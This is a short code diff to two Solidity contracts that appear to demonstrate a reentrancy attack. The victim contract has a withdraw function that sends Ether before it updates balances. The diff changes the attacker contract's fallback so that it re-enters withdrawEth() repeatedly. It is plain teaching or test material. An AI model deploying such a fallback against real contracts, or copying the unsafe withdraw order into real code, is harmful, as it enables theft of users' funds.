@@ -13,7 +13,6 @@ contract ReentrancyVuln {
         uint256 amountToWithdraw = balances[msg.sender];
         (bool success,) = payable(msg.sender).call{value: amountToWithdraw}("");
         require(success);
-        console.log(amountToWithdraw, "ETH SENT TO: ", msg.sender);
 
         // check effects fail
         balances[msg.sender] -= amountToWithdraw;
@@ -29,11 +28,7 @@ contract ExploitReentrancy {
         // require(success);
     }
     fallback() external payable {
-        if (times_to_reenter < 1) {
-            console.log("Fallback invoked, balance of contract is now: ", address(this).balance);
-            (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
-        }
-        times_to_reenter = times_to_reenter + 1;
-
+        console.log("Fallback invoked balance of contract is now:", address(this).balance / 1e18, "Ether");
+        (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
     }
 }
